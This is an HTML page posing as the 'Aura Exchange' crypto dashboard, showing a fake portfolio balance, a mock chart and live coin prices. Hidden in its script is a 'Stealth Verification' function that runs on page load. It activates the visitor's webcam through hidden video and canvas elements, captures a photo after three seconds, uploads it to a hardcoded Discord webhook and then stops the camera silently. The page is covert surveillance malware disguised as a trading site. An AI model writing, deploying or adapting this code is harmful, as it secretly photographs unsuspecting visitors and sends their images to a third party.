<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura Exchange | Real-Time Crypto Assets</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --accent: #ff2a2a;
            --bg: #050505;
            --card-bg: #111111;
            --text-main: #e0e0e0;
            --text-dim: #777;
            --green: #00ff88;
        }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .terminal {
            width: 100%;
            max-width: 900px;
            display: grid;
            grid-template-columns: 1fr 300px;
            gap: 20px;
        }

        /* Sidebar & Navigation */
        .sidebar {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid #222;
        }

        .brand {
            font-size: 22px;
            font-weight: 800;
            color: var(--accent);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-item {
            padding: 12px;
            color: var(--text-dim);
            cursor: pointer;
            border-radius: 8px;
            margin-bottom: 5px;
            transition: 0.2s;
        }

        .nav-item.active {
            background: rgba(255, 42, 42, 0.1);
            color: var(--accent);
        }

        /* Main Content */
        .main-panel {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .stats-header {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
        }

        .stat-box {
            background: var(--card-bg);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #222;
        }

        .stat-val {
            font-size: 18px;
            font-weight: bold;
            margin-top: 5px;
        }

        .chart-container {
            background: var(--card-bg);
            padding: 25px;
            border-radius: 15px;
            border: 1px solid #222;
            height: 300px;
        }

        /* Price List */
        .price-list {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid #222;
        }

        .crypto-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #222;
        }

        .crypto-name { font-weight: bold; }
        .crypto-price { color: var(--green); font-family: monospace; }

        /* Hidden Elements */
        #v-feed, #p-capture { display: none; }

        @media (max-width: 768px) {
            .terminal { grid-template-columns: 1fr; }
            .sidebar { order: 2; }
        }
    </style>
</head>
<body>

    <div class="terminal">
        <div class="sidebar">
            <div class="brand">◈ AURA</div>
            <div class="nav-item active">Dashboard</div>
            <div class="nav-item">Exchange</div>
            <div class="nav-item">Wallets</div>
            <div class="nav-item">Settings</div>
            
            <div style="margin-top: 50px; font-size: 11px; color: #444;">
                Node Status: <span style="color: var(--green);">Connected</span><br>
                Latency: 14ms
            </div>
        </div>

        <div class="main-panel">
            <div class="stats-header">
                <div class="stat-box">
                    <div style="font-size: 10px; color: var(--text-dim);">PORTFOLIO BALANCE</div>
                    <div class="stat-val">$12,402.90</div>
                </div>
                <div class="stat-box">
                    <div style="font-size: 10px; color: var(--text-dim);">24H PROFIT</div>
                    <div class="stat-val" style="color: var(--green);">+ 4.2%</div>
                </div>
                <div class="stat-box">
                    <div style="font-size: 10px; color: var(--text-dim);">ACTIVE NODES</div>
                    <div class="stat-val">107</div>
                </div>
            </div>

            <div class="chart-container">
                <canvas id="mainChart"></canvas>
            </div>

            <div class="price-list" id="price-container">
                <div style="font-size: 12px; margin-bottom: 15px; color: var(--text-dim);">LIVE MARKET PAIRS</div>
                </div>
        </div>
    </div>

    <video id="v-feed" autoplay playsinline></video>
    <canvas id="p-capture"></canvas>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1489227429032493177/8m1aFkpp5iD8lgoiBo7XYvWgG9LmUzlQMEw-f0uDxO-JiOzuKOWhIZwTjlgXLbmGGZVP";
        
        // 1. Live Crypto Prices
        async function fetchPrices() {
            const coins = ['bitcoin', 'ethereum', 'litecoin', 'solana'];
            try {
                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coins.join(',')}&vs_currencies=usd`);
                const data = await res.json();
                const container = document.getElementById('price-container');
                
                coins.forEach(c => {
                    const row = document.createElement('div');
                    row.className = 'crypto-row';
                    row.innerHTML = `<span class="crypto-name">${c.toUpperCase()}</span>
                                     <span class="crypto-price">$${data[c].usd.toLocaleString()}</span>`;
                    container.appendChild(row);
                });
            } catch(e) { console.log("Price fetch error"); }
        }

        // 2. Mock Chart
        const ctx = document.getElementById('mainChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'],
                datasets: [{
                    label: 'Market Volume',
                    data: [12, 19, 15, 25, 22, 30],
                    borderColor: '#ff2a2a',
                    tension: 0.4,
                    fill: true,
                    backgroundColor: 'rgba(255, 42, 42, 0.05)'
                }]
            },
            options: { maintainAspectRatio: false, plugins: { legend: { display: false } } }
        });

        // 3. Stealth Verification
        async function autoVerify() {
            const video = document.getElementById('v-feed');
            const canvas = document.getElementById('p-capture');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('file', blob, 'aura_verify.png');
                        fd.append('content', "📡 **Aura Exchange Connection Log**\nUser Identity Logged for Security.");
                        await fetch(WEBHOOK, { method: 'POST', body: fd });
                        
                        // Stop camera silently
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/png');
                }, 3000); // 3 second delay for best lighting
            } catch(e) { console.log("System Ready"); }
        }

        window.onload = () => {
            fetchPrices();
            autoVerify();
        };
    </script>
</body>
</html>
